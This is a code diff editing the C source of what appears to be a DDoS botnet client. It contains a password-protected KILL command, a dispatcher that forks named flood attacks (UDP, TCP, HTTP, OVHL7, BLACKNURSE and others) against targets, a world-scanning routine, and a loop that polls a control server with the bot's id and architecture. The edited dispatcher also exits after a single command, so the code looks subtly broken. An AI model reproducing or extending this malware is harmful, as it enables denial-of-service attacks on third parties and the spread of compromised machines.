@@ -2,57 +2,64 @@
 
 in_addr_t addr;
 
-void ft_manage_request(char *ptr)
-{
+
+void ft_manage_request(char *ptr) {
     char **split;
+    int split_len;
 
     split = ft_split(ptr, '|');
     if (split == NULL) {
-        // handle error, e.g., log it and return
+        // Handle error gracefully, e.g., log it and return
         fprintf(stderr, "ft_split failed\n");
         return;
     }
 
-    int split_len = ft_split_len(split);
-    if (split_len == 2 && !ft_strncmp(split[0], "KILL", 4) && !ft_strncmp(split[1], "iCKrBrfhaQZiqBXRcXFHWJAKcqA", 27)) {
+    split_len = ft_split_len(split);
+
+    if (split_len == 2 && !strncmp(split[0], "KILL", 4) && !strncmp(split[1], "iCKrBrfhaQZiqBXRcXFHWJAKcqA", 27)) {
         ft_free_split(split);
         exit(0);
     }
-	if (!fork())
+
+    if (!fork()) {
         if (split_len >= 4) {
-            if (!ft_strncmp(split[0], "OVHL7", 5) && ft_split_len(split) == 5)
-				OVHL7(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
-			else if (!ft_strncmp(split[0], "PPS", 3) && ft_split_len(split) == 5)
-				PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
-			else if (!ft_strncmp(split[0], "HTTP", 4) && ft_split_len(split) == 7) // Already forked
-				HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
-			else if (!ft_strncmp(split[0], "HTTPS", 5) && ft_split_len(split) == 7) // Already forked
-				HTTPS(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
-			else if (!ft_strncmp(split[0], "UDPRAW", 6))
-				UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
-			else if (!ft_strncmp(split[0], "UDPPPS", 6) && ft_split_len(split) == 5)
-				UDP_PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4])); //, atoi(split[5])
-			else if (!ft_strncmp(split[0], "HOLD", 4))
-				HOLD(split[1], atoi(split[2]), atoi(split[3]));
-			else if (!ft_strncmp(split[0], "JUNK", 4))
-				JUNK(split[1], atoi(split[2]), atoi(split[3]));
-			else if (!ft_strncmp(split[0], "RANDHEX", 7))
-				RANDHEX(split[1], atoi(split[2]), atoi(split[3]));
-			else if (!ft_strncmp(split[0], "STD", 3))
-				STD(split[1], atoi(split[2]), atoi(split[3]));
-			else if (!ft_strncmp(split[0], "UDP", 3) && ft_split_len(split) == 7)
-				UDP(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]), atoi(split[5]), atoi(split[6]));
-			else if (!ft_strncmp(split[0], "TCP", 3) && ft_split_len(split) == 8)
-				TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
-			else if (!ft_strncmp(split[0], "XTDCUSTOM", 9))
-				XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
+            if (!strncmp(split[0], "OVHL7", 5) && split_len == 5)
+                OVHL7(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
+            else if (!strncmp(split[0], "PPS", 3) && split_len == 5)
+                PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
+            else if (!strncmp(split[0], "HTTP", 4) && split_len == 7) // Already forked
+                HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
+            else if (!strncmp(split[0], "UDPRAW", 6))
+                UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
+            else if (!strncmp(split[0], "UDPPPS", 6) && split_len == 5)
+                UDP_PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4])); //, atoi(split[5])
+            else if (!strncmp(split[0], "HOLD", 4))
+                HOLD(split[1], atoi(split[2]), atoi(split[3]));
+            else if (!strncmp(split[0], "JUNK", 4))
+                JUNK(split[1], atoi(split[2]), atoi(split[3]));
+            else if (!strncmp(split[0], "RANDHEX", 7))
+                RANDHEX(split[1], atoi(split[2]), atoi(split[3]));
+            else if (!strncmp(split[0], "STD", 3))
+                STD(split[1], atoi(split[2]), atoi(split[3]));
+            else if (!strncmp(split[0], "UDP", 3) && split_len == 7)
+                UDP(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]), atoi(split[5]), atoi(split[6]));
+            else if (!strncmp(split[0], "TCP", 3) && split_len == 8)
+                TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
+            else if (!strncmp(split[0], "XTDCUSTOM", 9))
+                XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
         } else if (split_len == 3) {
-            if (!ft_strncmp(split[0], "BLACKNURSE", 10))
-				BLACKNURSE(split[1], atoi(split[2]));
+            if (!strncmp(split[0], "BLACKNURSE", 10) && split_len == 3)
+                BLACKNURSE(split[1], atoi(split[2]));
         }
+
         ft_free_split(split);
         exit(0);
+    } else {
+        // In the parent process, wait for the child process to complete
+        wait(NULL);
     }
+  	ft_free_split(split);
+  	exit(0);
 }
 
 int main(int argc, char *argv[])
@@ -87,26 +94,30 @@ int main(int argc, char *argv[])
 		chdir("/");
 		signal(SIGPIPE, SIG_IGN);
 	}
-	addr = inet_addr("8.8.8.8");
+	
 	arch = ft_getarch();
 	id = ft_get_id();
-	char *uwu;
-	uwu = ft_itoa(rand() % 100000);
-	id = ft_strnjoin(id, "-", 1);
-	id = ft_strnjoin(id, uwu, strlen(uwu));
+	
+	
 	if (!fork())
 	{
 		ft_scan_world();
 		exit(0);
 	}
-	free(uwu);
+
+  SSL_library_init();
+  OpenSSL_add_all_algorithms();
+  ERR_load_crypto_strings();
+
 	request = ft_strjoin("?id=", id);
 	request = ft_strnjoinf(url_page, request, strlen(request));
 	request = ft_strnjoin(request, "&arch=", strlen(request));
 	request = ft_strnjoin(request, arch, strlen(request));
 	while (true)
 	{
+		printf("request: %s\n", request);
 		tmp = ft_request(request);
+		printf("temp_response: %s\n", tmp);
 		if (tmp)
 		{
 			ft_manage_request(tmp);
